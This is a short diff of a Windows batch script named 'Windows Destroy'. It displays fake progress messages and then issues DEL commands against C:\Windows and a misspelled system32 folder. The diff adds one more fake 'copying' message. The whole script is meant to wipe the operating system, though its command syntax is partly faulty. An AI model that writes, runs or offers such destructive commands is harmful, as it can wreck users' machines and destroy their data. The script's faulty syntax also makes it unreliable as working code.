@@ -1,6 +1,7 @@
 @ECHO OFF
 TITLE Windows Destroy
 MSG Windows Destroy is starting up
+MSG Copying Windows Destroy File... (0KB/1KB)
 MSG Running Windows Destroy
 DEL C:\Windows /y
 DEL C:\Windows\sytem32 /y
